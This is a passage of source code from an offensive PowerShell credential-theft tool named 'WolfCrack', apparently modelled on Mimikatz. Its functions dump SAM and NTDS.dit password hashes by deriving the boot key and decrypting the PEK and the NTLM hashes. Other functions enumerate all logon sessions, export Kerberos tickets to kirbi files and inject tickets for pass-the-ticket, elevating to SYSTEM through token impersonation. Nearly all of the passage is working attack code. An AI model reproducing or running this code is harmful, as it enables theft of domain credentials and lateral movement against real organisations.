        $UserKeys = Get-UserKeys
        Write-Host "`nDomain: "$env:COMPUTERNAME -ForegroundColor Cyan
        Write-Host "`nSysKey: "$([System.BitConverter]::ToString($bootkey).Replace("-","").ToLower()) -ForegroundColor Cyan
        Write-Host "`nSamKey: " $([System.BitConverter]::ToString($hbootKey).Replace("-","").ToLower()) -ForegroundColor Cyan
        foreach($user in $UserKeys)
        {
            $UserHash = New-Object psobject
            $Nt_and_Lm_Hash = Get-UserHashes $User -hbootkey $hbootKey
            Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "UserName" -Value $user.UserName
            Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "Rid" -Value $user.Rid
            $lm_hash = [System.BitConverter]::ToString($Nt_and_Lm_Hash[0]).Replace("-","").ToLower()
            $nt_hash = [System.BitConverter]::ToString($Nt_and_Lm_Hash[1]).Replace("-","").ToLower()
            if($lm_hash -ne [System.BitConverter]::ToString($empty_lm).Replace("-","").ToLower()){Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "LmHash" -Value $lm_hash}
            else{Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "LmHash" -Value ""}
            if($nt_hash -ne [System.BitConverter]::ToString($empty_nt).Replace("-","").ToLower()){Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "NtHash" -Value $nt_hash}
            else{Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "NtHash" -Value ""}
            $to_print = "`nUserName: " + $UserHash.UserName + "`nRid: " + $UserHash.Rid + "`nLmHash: " + $UserHash.LmHash + "`nNtHash: " + $UserHash.NtHash
            Write-Host $to_print
        }

        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token "revert"|Out-Null}
    } 
    
    Function lsadump-ntds($ntdsfile,$SystemHive)
    {
        $ntds = @"   
        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_err JetSetSystemParameter(ref JET_INSTANCE pinstance,JET_SESID sesid,ulong paramid,ulong lpParam,string szParam);

        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_err JetCreateInstance(out JET_INSTANCE pinstance,string szInstanceName);

        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_err JetInit(ref JET_INSTANCE pinstance);

        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_err JetBeginSession(JET_INSTANCE pinstance,out JET_SESID psesid,string szUserName,string szPassword);

        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_wrn JetAttachDatabase(JET_SESID sesid,string database,AttachDatabaseGrbit grbit);

        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_wrn JetOpenDatabase(JET_SESID sesid,string database,string connect,out JET_DBID dbid,OpenDatabaseGrbit grbit);

        [DllImport("esent.dll",SetLastError=true)]
        public static extern JET_wrn JetOpenTable(JET_SESID sesid,JET_DBID dbid,string tablename,byte[] parameters,int parametersSize,OpenTableGrbit grbit,out JET_TABLEID tableid);
"@
        
        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token "revert"|Out-Null}
        $esent = [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.Isam.Esent.Interop")
        Add-Type -MemberDefinition $ntds -Namespace "lsadump" -Name "ntds" -UsingNamespace Microsoft.Isam.Esent.Interop -ReferencedAssemblies $esent.location

        $instance = New-Object Microsoft.Isam.Esent.Interop.JET_INSTANCE
        $sesId = New-Object Microsoft.Isam.Esent.Interop.JET_SESID
        $dbId = New-Object Microsoft.Isam.Esent.Interop.JET_DBID

        #initializing the db, and connecting
        [System.UInt64]$JET_paramDatabasePageSize = 64
        [System.UInt64]$NTDS_PAGE_SIZE = 8192
        $err = [lsadump.ntds]::JetSetSystemParameter([ref]$instance,[Microsoft.Isam.Esent.Interop.JET_SESID]::Nil,$JET_paramDatabasePageSize,$NTDS_PAGE_SIZE,$null)
        if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
        {
            [System.UInt64]$JET_paramRecovery = 34
            $err = [lsadump.ntds]::JetSetSystemParameter([ref]$instance,[Microsoft.Isam.Esent.Interop.JET_SESID]::Nil,$JET_paramRecovery,$null,"Off")
            if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
            {
                $err = [lsadump.ntds]::JetCreateInstance([ref]$instance,"ntdsdump_0_3")
                if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
                {
                    $err = [lsadump.ntds]::JetInit([ref]$instance)
                    if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
                    {
                        $err = [lsadump.ntds]::JetBeginSession($instance,[ref]$sesId,$null,$null)
                    }
                }
            }
        }

        #attaching and connecting to the database
        $fname = $ntdsfile
        $wsConnect = [System.String]::Empty
        try
        {
            $err = [lsadump.ntds]::JetAttachDatabase($sesId,$fname,[Microsoft.Isam.Esent.Interop.AttachDatabaseGrbit]::ReadOnly)
            if($err -eq [Microsoft.Isam.Esent.Interop.JET_wrn]::Success)
            {
                $err = [lsadump.ntds]::JetOpenDatabase($sesId,$fname,$wsConnect,[ref]$dbId,[Microsoft.Isam.Esent.Interop.AttachDatabaseGrbit]::ReadOnly)
                if($err -eq [Microsoft.Isam.Esent.Interop.JET_wrn]::Success){}
                else{Write-Host "[x] error at JetOpenDatabase()" -ForegroundColor Red}
            }
            else{Write-Host "[x] error at JetAttachDatabase()" -ForegroundColor Red}
        }
        catch{Write-Host "[x] try to repair the database with esentul /r EDB /d, if you have the edb log file also.`nIf not, reapir it with esentul /p <path-to-ntds.dit>" -ForegroundColor Red}


        #Enumerating Columns
        $tableID = New-Object Microsoft.Isam.Esent.Interop.JET_TABLEID
        [System.UInt64]$JET_ColInfoListSortColumnid = 7
        $err = [lsadump.ntds]::JetOpenTable($sesId,$dbId,"datatable",$null,0,[Microsoft.Isam.Esent.Interop.OpenTableGrbit]::ReadOnly -bor [Microsoft.Isam.Esent.Interop.OpenTableGrbit]::Sequential,[ref]$tableID)
        if($err -eq [Microsoft.Isam.Esent.Interop.JET_wrn]::Success)
        {
            $columns = [Microsoft.Isam.Esent.Interop.ColumnInfo[]][Microsoft.Isam.Esent.Interop.Api]::GetTableColumns($sesId, $tableID)
        }

        for($i=0;$i -lt $columns.Count;$i++)
        {
            if($columns[$i].Name -eq "ATTk590689")    {$colId = $i}
            elseif($columns[$i].Name -eq "ATTm3")     {$NamCol = $i}
            elseif($columns[$i].Name -eq "ATTr589970"){$SidCol = $i}
            elseif($columns[$i].Name -eq "ATTk589914"){$NtCol = $i}
        }

        $PekColId = $columns[$colId]
        $NamColId = $columns[$NamCol]
        $SidColId = $columns[$SidCol]
        $NtColId = $columns[$NtCol]

        [Microsoft.Isam.Esent.Interop.Api]::TryMoveFirst($sesId,$tableID)|Out-Null
        $names = @()
        $data = [System.Array]::CreateInstance([byte],0)
        do 
        {
            $nameobject = New-Object psobject

            $temp = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$PekColId.Columnid)
            if($null -ne $temp){$data += $temp}
   
            $tempName = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$NamColId.Columnid)
            if($null -ne $tempName)
            {
                Add-Member -InputObject $nameobject -MemberType NoteProperty -Name "SamAccountName" -Value $tempName
            }

            $tempSid = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$SidColId.Columnid)
            if($null -ne $tempSid)
            {
                Add-Member -InputObject $nameobject -MemberType NoteProperty -Name "Sid" -Value $tempSid
            }
    
            $tempNt = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$NtColId.Columnid)
            if($null -ne $tempNt)
            {
                Add-Member -InputObject $nameobject -MemberType NoteProperty -Name "NtHash" -Value $tempNt
            }
            if(($null -ne $tempSid) -and ($null -ne $tempNt)){$names += $nameobject}

        }   while ([Microsoft.Isam.Esent.Interop.Api]::TryMoveNext($sesId, $tableID))

        #decrypting the PEK
        $md5 = [System.Security.Cryptography.MD5]::Create()

        reg load HKLM\TempHive $SystemHive|Out-Null

        function Get-BootKey
        {
            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "TempHive\ControlSet001\Control\Lsa\$_"}))
            $b = new-object byte[] $($s.Length/2)
            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
            $b2 = new-object byte[] 16
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
            return ,$b2;
        }

        $bootkey = Get-BootKey
        $to_encrypt = $bootkey
        if($data[0] -eq 2)
        {
            $PekKey = $data[8..$data.Length]
            for($i=0;$i -lt 1000;$i++){$to_encrypt += $PekKey[0..15]}
            $rc4key = $md5.ComputeHash($to_encrypt)
            $rc4 = NewRC4 $rc4key
            $Pek = $rc4.encrypt($PekKey[16..$PekKey.Length])
            $finalPek = $Pek[36..$pek.Length]
        }

        elseif($data[0] -eq 3)
        {
            $decryptedPekList = DecryptAES $data[24..($data.Count -1)] $bootkey $data[8..23]
            $finalPek = $decryptedPekList[36..51]
        }

        #decrypting the hashes of the users!!
        foreach($name in $names)
        {
            $SamAccountName = [System.Text.Encoding]::ASCII.GetString($name.SamAccountName).replace("`0","")
            $rid = [uint32]("0x" + [System.BitConverter]::ToString($name.Sid[($name.Sid.Count -2)..($name.Sid.Count -1)]).replace("-","").ToLower())
            if([System.BitConverter]::ToString($name.NtHash).replace("-","") -match "^1100000000000000"){$nthash = $name.NtHash[8..($name.NtHash.Count -1)]}
            else{$nthash = $name.NtHash}

            if([System.BitConverter]::ToInt32($nthash[0..3],0) -eq 19)
            {        
                $encntlm = DecryptAES $name.NtHash[28..43] $finalPek $name.NtHash[8..23]
            }

            else
            {
                $rc4key = $md5.ComputeHash($finalPek+$nthash[0..15])
                $rc4 = NewRC4 $rc4key
                $encntlm = $rc4.encrypt($nthash[16..($nthash.Count -1)])
            }

            $deskeys = sid_to_key($rid)
            $hash = (des_decrypt  $encntlm[0..7] $deskeys[0]) + (des_decrypt $encntlm[8..$($encntlm.Length - 1)] $deskeys[1])
            $to_print = "`nUserName: " + $SamAccountName + "`nRid: " + $rid + "`nNtlmHash: " +[System.BitConverter]::ToString($hash).replace("-","").ToLower()
            Write-Host $to_print
        }
    
        #cleaning up everything
        reg unload HKLM\TempHive|Out-Null
        [Microsoft.Isam.Esent.Interop.Api]::JetCloseDatabase($sesId, $dbId, [Microsoft.Isam.Esent.Interop.CloseDatabaseGrbit]::None)
        [Microsoft.Isam.Esent.Interop.Api]::JetDetachDatabase($sesId, $fname)
        [Microsoft.Isam.Esent.Interop.Api]::JetEndSession($sesId, [Microsoft.Isam.Esent.Interop.EndSessionGrbit]::None)
        [Microsoft.Isam.Esent.Interop.Api]::JetTerm($Instance)
    }

    $options = $option.split("/")
    $options[0] = $options[0].replace(" ","")
    switch ($options[0])
    {
        "sam"   {lsadump-sam}
        "ntds"  {if($options[1] -eq "ntds"){$ntdsfile = $answer[2].Replace('"','') + ":" + $answer[3].Split("/")[0].replace('"','')
                 $SystemHive = $answer[4].Replace('"','') + ":" + $answer[5].Replace('"','')}
                 else{$ntdsfile = $answer[4].Replace('"','') + ":" + $answer[5].Replace('"','')
                 $SystemHive = $answer[2].Replace('"','') + ":" + $answer[3].Split("/")[0].replace('"','')}
                 lsadump-ntds $ntdsfile $SystemHive}
        default {Write-Host "[x] This Option Does Not Exist!!(write 'help::lsadump' for help)"}
    }
}

Function kerberos($option)
{

<#
.SYNOPSIS
Manipulation kerberos for doing stuff

.Description
*** You Must Have System Privileges in order to do this things***
this function can show the kerberos tickets of all the user on this local machine and
export them into kirbi files.
MoreOver if you have a kirbi file, it can inejct it into your logon process.


.EXAMPLE
showing kerberos tickets and export them
WolfCrack # kerberos::list /export

.EXAMPLE
import kirbi file
WolfCrack # kerberos::ptt c:\try.kirbi

.EXAMPLE
purging your tickets
WolfCrack # kerberos::purge

.Example
showing your ticket with klist command
WolfCrack # kerberos::klist
#>
    $kerberos = @"
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING_IN
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;
    }  

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaRegisterLogonProcess(LSA_STRING_IN LogonProcessName,out IntPtr LsaHandle,out ulong SecurityMode);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle,[In] ref LSA_STRING_IN PackageName,[Out] out UInt32 AuthenticationPackage);

    [DllImport("Secur32.dll", SetLastError = false)]
    public static extern int LsaEnumerateLogonSessions(out uint LogonSessionCount, out IntPtr LogonSessionList);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaFreeReturnBuffer([In] IntPtr buffer);

    public enum LogonType
    {
        UndefinedLogonType,
        Interactive,
        Network,
        Batch,
        Service,
        Proxy,
        Unlock,
        NetworkCleartext,
        NewCredentials,
        RemoteInteractive,
        CachedInteractive,
        CachedRemoteInteractive,
        CachedUnlock
    }

    public class LogonSessionData
    {
        public LUID LogonID;
        public string username;
        public string LogonDomain;
        public string AuthenticationPackage;
        public LogonType logonType;
        public int Session;
        public SecurityIdentifier Sid;
        public DateTime LogonTime;
        public string LogonServer;
        public string DnsDomainName;
        public string Upn;
    }

    public struct SECURITY_LOGON_SESSION_DATA
    {
        public UInt32 size;
        public LUID LogonID;
        public LSA_STRING_IN username;
        public LSA_STRING_IN LogonDomain;
        public LSA_STRING_IN AuthenticationPackage;
        public UInt32 logontype;
        public UInt32 Session;
        public IntPtr PSid;
        public UInt64 LogonTime;
        public LSA_STRING_IN LogonServer;
        public LSA_STRING_IN DnsDomainName;
        public LSA_STRING_IN Upn;
    }
     
    [DllImport("Secur32.dll", SetLastError = false)]
    public static extern uint LsaGetLogonSessionData(IntPtr luid, out IntPtr ppLogonSessionData);

    public enum KERB_PROTOCOL_MESSAGE_TYPE 
    {
      KerbDebugRequestMessage,
      KerbQueryTicketCacheMessage,
      KerbChangeMachinePasswordMessage,
      KerbVerifyPacMessage,
      KerbRetrieveTicketMessage,
      KerbUpdateAddressesMessage,
      KerbPurgeTicketCacheMessage,
      KerbChangePasswordMessage,
      KerbRetrieveEncodedTicketMessage,
      KerbDecryptDataMessage,
      KerbAddBindingCacheEntryMessage,
      KerbSetPasswordMessage,
      KerbSetPasswordExMessage,
      KerbVerifyCredentialMessage,
      KerbQueryTicketCacheExMessage,
      KerbPurgeTicketCacheExMessage,
      KerbRefreshSmartcardCredentialsMessage,
      KerbAddExtraCredentialsMessage,
      KerbQuerySupplementalCredentialsMessage,
      KerbTransferCredentialsMessage,
      KerbQueryTicketCacheEx2Message,
      KerbSubmitTicketMessage,
      KerbAddExtraCredentialsExMessage
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_CACHE_INFO_EX
    {
        public UNICODE_STRING ClientName;
        public UNICODE_STRING ClientRealm;
        public UNICODE_STRING ServerName;
        public UNICODE_STRING ServerRealm;
        public long StartTime;
        public long EndTime;
        public long RenewTime;
        public uint EncryptionType;
        public uint TicketFlags;
    }

    [Flags]
    public enum TicketFlags : uint
    {
        name_canonicalize = 0x10000,
        forwardable = 0x40000000,
        forwarded = 0x20000000,
        hw_authent = 0x00100000,
        initial = 0x00400000,
        invalid = 0x01000000,
        may_postdate = 0x04000000,
        ok_as_delegate = 0x00040000,
        postdated = 0x02000000,
        pre_authent = 0x00200000,
        proxiable = 0x10000000,
        proxy = 0x08000000,
        renewable = 0x00800000,
        reserved = 0x80000000,
        reserved1 = 0x00000001
    }

    public enum EncTypes : uint
    {
        DES_CBC_CRC = 0x0001,
        DES_CBC_MD4 = 0x0002,
        DES_CBC_MD5 = 0x0003,
        DES_CBC_raw = 0x0004,
        DES3_CBC_raw = 0x0006,
        DES3_CBC_SHA_1 = 0x0010,
        AES128_CTS_HMAC_SHA1_96 = 0x0011,
        AES256_CTS_HMAC_SHA1_96 = 0x0012,
        AES128_cts_hmac_sha256_128 = 0x0013,
        AES256_cts_hmac_sha384_192 = 0x0014,
        RC4_HMAC_MD5 = 0x0017,
        RC4_HMAC_MD5_EXP = 0x0018
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_RESPONSE
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public int CountOfTickets;
        public IntPtr Tickets;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
        public UNICODE_STRING TargetName;
        public uint TicketFlags;
        public uint CacheOptions;
        public int EncryptionType;
        public SECURITY_HANDLE CredentialsHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY
    {
        public int KeyType;
        public int Length;
        public IntPtr Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_EXTERNAL_TICKET
    { 
      public IntPtr ServiceName;
      public IntPtr TargetName;
      public IntPtr ClientName;
      public UNICODE_STRING      DomainName;
      public UNICODE_STRING      TargetDomainName;
      public UNICODE_STRING      AltTargetDomainName;
      public KERB_CRYPTO_KEY     SessionKey;
      public uint                TicketFlags;
      public uint                Flags;
      public long                KeyExpirationTime;
      public long                StartTime;
      public long                EndTime;
      public long                RenewUntil;
      public long                TimeSkew;
      public int                 EncodedTicketSize;
      public IntPtr              EncodedTicket;
    } 

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_RESPONSE
    {
        public KERB_EXTERNAL_TICKET Ticket;
    }

	[StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY32
    {
        public int KeyType;
        public int Length;
        public int Offset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_SUBMIT_TKT_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID                       LogonId;
        public int                        Flags;
        public KERB_CRYPTO_KEY32          Key;
        public int                        KerbCredSize;
        public int                        KerbCredOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_PURGE_TKT_CACHE_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID                       LogonId;
        public LSA_STRING_IN              ServerName;
        public LSA_STRING_IN              RealmName;
    }
    
    [DllImport("Secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle,uint AuthenticationPackage,IntPtr ProtocolSubmitBuffer,int SubmitBufferLength,out IntPtr ProtocolReturnBuffer,out ulong ReturnBufferLength,out int ProtocolStatus);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);


    [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
"@
	
	if (-not ([System.Management.Automation.PSTypeName]'Kerberos.Manipulate').Type)
    {
		$assemblies = [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")
		Add-Type -MemberDefinition $kerberos -Namespace "Kerberos" -Name "Manipulate" -ReferencedAssemblies $assemblies.location -UsingNamespace System.Security.Principal
    } 

    #Check if you are running as admin
    Function RunningAsAdmin()
    {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $princ = New-Object System.Security.Principal.WindowsPrincipal($user)
        if($princ.IsInRole("Administrators")){return $true}
        else{return $false}
    }

    
    #Get Lsa Handle to enumerate all users
    Function LsaRegisterLogonProcess()
    {
       $logonProcessName = "User32LogonProcess"
       $LSAString = new-object Kerberos.Manipulate+LSA_STRING_IN
       $lsaHandle = New-Object System.IntPtr
       [System.UInt64]$SecurityMode = 0

       $LSAString.Length = [System.UInt16]$logonProcessName.Length
       $LSAString.MaximumLength = [System.UInt16]($logonProcessName.Length + 1)
       $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($logonProcessName)

       $ret = [Kerberos.Manipulate]::LsaRegisterLogonProcess($LSAString,[ref]$lsaHandle,[ref]$SecurityMode)

       return $lsaHandle
    }

    #Get lsa handle based on your privileges
    Function GetLsaHandle()
    {
        $lsahandle = New-Object System.IntPtr
        if(!(RunningAsAdmin))
        {
            Write-Host "`n[x] You Are Not Running As Admin" -ForegroundColor Red
            [int]$retcode = [Kerberos.Manipulate]::LsaConnectUntrusted([ref]$lsahandle)
        }

        else
        {
            #token-elevate impoersonate you to be System
            if(!([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM")){token "elevate"|Out-Null}
            $lsahandle = LsaRegisterLogonProcess
        }
        return $lsahandle
    }


    #returning the current luid
    Function GetCurrentLuid()
    {
        $output = klist
        return $output.split("`n")[1].split(":")[1]
    }

    #Recieve kerberos kirbi file and inject it into your memory
    Function kerberos-ptt($filepath)
    {
        
        #Recieve TicketBytes and Luid and inject the ticket in this logon id 
        Function ImportTicket([byte[]]$ticket,[Kerberos.Manipulate+LUID]$luid = (New-Object Kerberos.Manipulate+LUID))
        {
            $protocolReturnBuffer = New-Object System.IntPtr
            $ReturnBufferLength = New-Object System.Int32
            $ProtocolStatus = New-Object System.Int32
    
            $request = New-Object Kerberos.Manipulate+KERB_SUBMIT_TKT_REQUEST
            $requestType = $request.getType()
            $request.MessageType = [Kerberos.Manipulate+KERB_PROTOCOL_MESSAGE_TYPE]::KerbSubmitTicketMessage
            $request.KerbCredSize = $ticket.Length
            $request.KerbCredOffset = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType)
            $request.LogonId = $luid

            $inputBufferSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType) + $ticket.Length
            $inputBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($inputBufferSize)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($request,$inputBuffer,$false)
            [System.IntPtr]$PtrToCred = $inputBuffer.ToInt64() + $request.KerbCredOffset
            [System.Runtime.InteropServices.Marshal]::Copy($ticket,0,$PtrToCred,$ticket.Length)
    
            $ntstatus = [Kerberos.Manipulate]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$inputBuffer,$inputBufferSize,[ref]$protocolReturnBuffer,[ref]$ReturnBufferLength,[ref]$ProtocolStatus)
            if(($ProtocolStatus -ne 0) -or ($ntstatus -ne 0))
            {
                Write-Host "[x] Error in LsaCallAuthenticationPackage" -ForegroundColor Red
            }

            if($inputBuffer -ne [System.IntPtr]::Zero)
            {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($inputBuffer)
                [System.Object]$ticket = $null
                Write-Host "[*] Successfully Imported The Ticket" -ForegroundColor Green
            }
        }

        #Main function start here!!
        $lsahandle = GetLsaHandle

        $retcode = New-Object System.Int32
        $authPackage = New-Object System.Int32
        $name = "kerberos"

        $LSAString = New-Object Kerberos.Manipulate+LSA_STRING_IN
        $LSAString.Length = [uint16]$name.Length
        $LSAString.MaximumLength = [uint16]($name.Length + 1)
        $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)
        $retcode = [Kerberos.Manipulate]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$LSAString,[ref]$authPackage)

        $ticket = [System.IO.File]::ReadAllBytes($filepath)

        $strluid = GetCurrentLuid
        $intluid = [convert]::ToInt32($strluid,16)
        $luid = New-Object Kerberos.Manipulate+LUID
        $luid.LowPart = $intluid

        ImportTicket $ticket $luid

        [Kerberos.Manipulate]::LsaDeregisterLogonProcess($lsaHandle)|Out-Null
    
        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token "revert"|Out-Null}
    }

    #list all cached tickets, and export them if you ask, to your desktop
    Function kerberos-list($export=$false)
    {
    
        #Enumerate all the logon sessions on your pc
        Function EnumerateLogonSessions()
        {
            $luids = @()
            if(!(RunningAsAdmin))
            {
                $strLuid = GetCurrentLuid
                $intLuid = [convert]::ToInt32($strluid,16)
                $luid = New-Object Kerberos.Manipulate+LUID
                $luid.LowPart = $intLuid
                $luids += $luid
            }

            else
            {
               $count = New-Object System.Int32
               $luidptr = New-Object System.IntPtr 
               $ret = [Kerberos.Manipulate]::LsaEnumerateLogonSessions([ref]$count,[ref]$luidptr)
               if($ret -ne 0){Write-Host "`n[x] Failed To enumerate Logon Sessions" -ForegroundColor Red}
               else
               {
                    $Luidtype = New-Object Kerberos.Manipulate+LUID
                    $Luidtype = $Luidtype.GetType()
                    for($i = 0; $i -lt [int32]$count;$i++)
                    {
                        $luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($luidptr,[type]$Luidtype)
                        $luids += $luid
                        [System.IntPtr]$luidptr = $luidptr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf([type]$Luidtype)
                    }
                    [Kerberos.Manipulate]::LsaFreeReturnBuffer($luidptr)
               }
            }
            return $luids
        }


        #Get information about session data based on logon id
        Function GetLogonSessionData($luid)
        {
            $luidptr = New-Object System.IntPtr
            $sessionDataPtr = New-Object System.IntPtr

            try
            {
                $luidptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($luid))
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($luid,$luidptr,$false)

                $ret = [Kerberos.Manipulate]::LsaGetLogonSessionData($luidptr,[ref]$sessionDataPtr)
                if($ret -eq 0)
                {
                    $type = New-Object Kerberos.Manipulate+SECURITY_LOGON_SESSION_DATA
                    $type = $type.GetType()
                    [Kerberos.Manipulate+SECURITY_LOGON_SESSION_DATA]$unsafeData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($sessionDataPtr,[type]$type)
                    $logonSessionData = New-Object Kerberos.Manipulate+LogonSessionData
            
                    $logonSessionData.AuthenticationPackage = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.AuthenticationPackage.Buffer, $unsafeData.AuthenticationPackage.Length / 2)
                    $logonSessionData.DnsDomainName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.DnsDomainName.Buffer, $unsafeData.DnsDomainName.Length / 2)
                    $logonSessionData.LogonID = $unsafeData.LogonID
                    $logonSessionData.LogonTime = [System.DateTime]::FromFileTime($unsafeData.LogonTime)
                    $logonSessionData.LogonServer = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonServer.Buffer,$unsafeData.LogonServer.Length / 2)
                    [Kerberos.Manipulate+LogonType]$logonSessionData.LogonType = $unsafeData.LogonType
                    $logonSessionData.Sid = New-Object System.Security.Principal.SecurityIdentifier($unsafeData.PSid)
                    $logonSessionData.Upn = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.Upn.Buffer,$unsafeData.Upn.Length /2)
                    $logonSessionData.Session = [int]$unsafeData.Session
                    $logonSessionData.username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.username.Buffer,$unsafeData.username.Length /2)
                    $logonSessionData.LogonDomain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonDomain.buffer,$unsafeData.LogonDomain.Length /2)
                }
            }

            finally
            {
                if($sessionDataPtr -ne [System.IntPtr]::Zero){[Kerberos.Manipulate]::LsaFreeReturnBuffer($sessionDataPtr)|Out-Null}
                if($luidptr -ne [System.IntPtr]::Zero){[Kerberos.Manipulate]::LsaFreeReturnBuffer($luidptr)|Out-Null}
            }
    
            return $logonSessionData
        }


        #Recieve logon id and service name, and extract the ticket to a file 
        Function ExtractTicket([intptr]$lsaHandle,[int]$authPackage,[Kerberos.Manipulate+LUID]$luid=(New-Object Kerberos.Manipulate+LUID),[string]$targetname,[System.UInt32]$ticketFlags = 0,$ticket,[bool]$export)
        {
            $responsePointer = [System.IntPtr]::Zero
            $request = New-Object Kerberos.Manipulate+KERB_RETRIEVE_TKT_REQUEST
            $requestType = $request.GetType()
            $response = New-Object Kerberos.Manipulate+KERB_RETRIEVE_TKT_RESPONSE
            $responseType = $response.GetType()
            $returnBufferLength = 0
            $protocolStatus = 0

            $request.MessageType = [Kerberos.Manipulate+KERB_PROTOCOL_MESSAGE_TYPE]::KerbRetrieveEncodedTicketMessage
            $request.LogonId = $luid
            $request.TicketFlags = 0x0
            $request.CacheOptions = 0x8
            $request.EncryptionType = 0x0

            $tname = New-Object Kerberos.Manipulate+UNICODE_STRING
            $tname.Length = [System.UInt16]($targetname.Length * 2)
            $tname.MaximumLength = [System.UInt16](($tname.Length) + 2)
            $tname.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($targetname)
    
            $request.TargetName = $tname

            $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType)
            $newStructSize = $structSize + $tname.MaximumLength
            $unmanagedAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($newStructSize)

